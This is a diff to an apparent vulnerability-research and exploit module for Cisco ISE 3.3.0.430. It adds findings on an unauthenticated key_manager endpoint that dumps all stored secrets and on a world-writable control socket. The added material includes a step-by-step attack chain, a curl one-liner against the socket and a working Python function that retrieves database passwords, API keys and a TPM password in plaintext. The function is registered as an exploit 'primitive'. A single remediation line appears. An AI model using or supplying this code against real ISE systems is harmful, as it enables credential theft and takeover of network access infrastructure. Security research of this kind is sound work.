@@ -35,6 +35,8 @@ ISE-F8: PostgreSQL trust auth (no password) accessible from Docker bridge networ
 ISE-F9: IRF RabbitMQ user irf:irf hardcoded, administrator tag, vhost irf [HIGH]
 ISE-F10: SSE Connector port 8989 all-interfaces + push_cmd=true + FileUpload=true [HIGH]
 ISE-F11: EDDA container -v /var/run/:/host/var/run/ --network=host = key_manager escape [CRITICAL]
+ISE-F12: GET /api/system/v1/key-manager/all_data — full in-memory credential dump, no auth [CRITICAL]
+ISE-F13: ExecStartPost=chmod o+w key_manager.sock — world-writable socket post-start [HIGH]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -143,6 +145,80 @@ ISE uses RabbitMQ for internal service bus (ERS events, pxGrid notifications, po
 Injecting messages into ISE's internal messaging bus = policy poisoning vector.
 After guest deletion, ISE uses `rabbitmq` user with password from db.properties
 (same decrypt-oracle chain as ISE-F1 applies to RABBITMQ_PWD).
+
+=== ISE-F12: key_manager all_data — unauthenticated full credential dump ===
+
+Source: key_manager_server.py (ise_key_manager-1.0.0-1.x86_64.rpm)
+  GET /api/system/v1/key-manager/all_data
+
+Handler (key_manager_server.py lines 476-507):
+  @ensure_key_manager_is_initialized   <- NOT an auth check; checks inst.is_initialized
+  async def get_all_data(self, request):
+      ...
+      response = get_tpm2_manager_password()  # fetches TPM2 manager password
+      self.key_manager_cache = dict(self.key_manager_cache, **result)  # merges into cache
+      return web.json_response({"result": self.key_manager_cache}, status=200)
+
+ensure_key_manager_is_initialized (utils.py lines 16-29):
+  async def is_initialized(inst, *args, **kwargs):
+      if inst.is_initialized:          # True on any running ISE system
+          return await func(inst, *args, **kwargs)
+      else:
+          return aiohttp.web.json_response({"error": "..."}, status=503)
+
+Response contains self.key_manager_cache, which includes:
+  {
+    "sealed_keys": [
+      {"data_type": "key_mgr_passphrase", "data": "<64-char hex passphrase>", ...},
+      {"data_type": "oracle_db_password", "data": "<Oracle SYS password>", ...},
+      {"data_type": "meraki_api_key", "data": "<Meraki admin key>", ...},
+      ...  # ALL data_types sealed by ANY ISE component via key_manager
+    ],
+    "tpm2_mgr_password": "<20-char TPM2 manager password>"
+  }
+
+This is the top-tier variant of ISE-F1: whereas /decrypt requires submitting a known ciphertext,
+/all_data requires NO input and returns ALL secrets in a single GET request.
+
+One-liner from any local process (ISE-F13 makes socket world-writable):
+  curl -s --unix-socket /var/run/key_manager.sock \
+    http://localhost/api/system/v1/key-manager/all_data
+
+Attack chain:
+  1. Any local access (ISE-F11 EDDA shell, cron, sudo, ISE service process)
+  2. GET /api/system/v1/key-manager/all_data via world-writable socket (ISE-F13)
+  3. Extract key_mgr_passphrase + ALL sealed secrets in one response
+  4. No further decryption steps needed — all data is already in plaintext
+
+=== ISE-F13: key_manager.service world-writable socket via ExecStartPost ===
+
+Source: /usr/lib/systemd/system/key_manager.service (ise_key_manager-1.0.0-1.x86_64.rpm)
+
+Socket unit (key_manager.socket):
+  ListenStream=/var/run/key_manager.sock
+  SocketMode=0600     <- root-only at creation
+  SocketUser=root
+
+Service unit ExecStartPost (key_manager.service):
+  ExecStartPost=chmod o+w /var/run/key_manager.sock   <- OVERWRITES to world-writable
+
+After this ExecStartPost, effective permissions are 0602 (rw------w-):
+  - Owner (root): read + write
+  - Other (world): write     <- UNIX domain socket write perm = connect perm
+
+Result: ANY local process on ISE (any UID, any user, any container with /var/run/ mount)
+can connect to the key_manager socket and call any of its endpoints.
+
+This is the root enabler for ISE-F1, ISE-F11, ISE-F12:
+  - ISE-F1: /decrypt oracle accessible to all local processes
+  - ISE-F11: EDDA container with -v /var/run/:/host/var/run/ gets world-writable socket
+  - ISE-F12: /all_data full dump accessible to all local processes
+
+The intended design (as evidenced by SocketMode=0600 in the socket unit) was root-only access.
+The ExecStartPost chmod is either a development shortcut or ISE service compatibility fix
+that was shipped to production, negating all UNIX socket access control.
+
+Remediation: Remove chmod line; add SocketGroup=ise-services or specific GIDs for callers.
 
 === ISE-F11: EDDA container — key_manager socket escape via /var/run mount ===
 
@@ -492,6 +568,53 @@ def decrypt_ise_db_password_from_kek(ciphertext_b64: str, kek_bytes: bytes) -> s
 
 KEY_MANAGER_SOCK = "/var/run/key_manager.sock"
 KEY_MANAGER_ALL_DATA_PATH = "/api/system/v1/key-manager/all_data"
+
+
+def dump_all_key_manager_secrets(sock_path: str = KEY_MANAGER_SOCK) -> Optional[dict]:
+    """
+    ISE-F12: GET /api/system/v1/key-manager/all_data via world-writable UNIX socket.
+
+    Returns the full key_manager in-memory cache: all sealed keys in plaintext
+    (key_mgr_passphrase, Oracle DB password, Meraki API key, etc.) plus TPM2 manager password.
+
+    No authentication required — @ensure_key_manager_is_initialized checks is_initialized
+    (always True on a running ISE system), not caller identity.
+
+    World-writable socket via ISE-F13: ExecStartPost=chmod o+w /var/run/key_manager.sock
+    Any local process can connect regardless of UID.
+
+    Returns dict with 'result' key containing:
+      {"sealed_keys": [{"data_type": ..., "data": "<plaintext_secret>", ...}],
+       "tpm2_mgr_password": "..."}
+    """
+    import socket
+    import json
+
+    request = (
+        f"GET {KEY_MANAGER_ALL_DATA_PATH} HTTP/1.1\r\n"
+        f"Host: localhost\r\n"
+        f"Connection: close\r\n"
+        f"\r\n"
+    ).encode()
+
+    try:
+        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        sock.connect(sock_path)
+        sock.sendall(request)
+        response = b""
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            response += chunk
+        sock.close()
+        header_end = response.find(b"\r\n\r\n")
+        if header_end == -1:
+            return None
+        body = response[header_end + 4:]
+        return json.loads(body.decode('utf-8', errors='replace'))
+    except Exception:
+        return None
 
 
 def probe_key_manager_socket(sock_path: str = KEY_MANAGER_SOCK) -> Optional[dict]:
@@ -1067,17 +1190,18 @@ def list_irf_queues(host: str, port: int = RABBITMQ_MGMT_PORT) -> Optional[list]
 
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.4.0",
+    "version": "1.5.0",
     "target": "Cisco ISE 3.3.0.430",
-    "findings": ["ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5", "ISE-F6", "ISE-F7", "ISE-F8", "ISE-F9", "ISE-F10", "ISE-F11"],
-    "critical": ["ISE-F1", "ISE-F6", "ISE-F11"],
-    "high": ["ISE-F2", "ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10"],
+    "findings": ["ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5", "ISE-F6", "ISE-F7", "ISE-F8", "ISE-F9", "ISE-F10", "ISE-F11", "ISE-F12", "ISE-F13"],
+    "critical": ["ISE-F1", "ISE-F6", "ISE-F11", "ISE-F12"],
+    "high": ["ISE-F2", "ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13"],
     "medium": ["ISE-F5", "ISE-F8"],
     "low": ["ISE-F4"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
     "primitives": [
         "decrypt_legacy_ise_db_password",
         "decrypt_ise_db_password_from_kek",
+        "dump_all_key_manager_secrets",
         "probe_key_manager_socket",
         "extract_credential_via_decrypt_oracle",
         "extract_oracle_password_via_oracle",
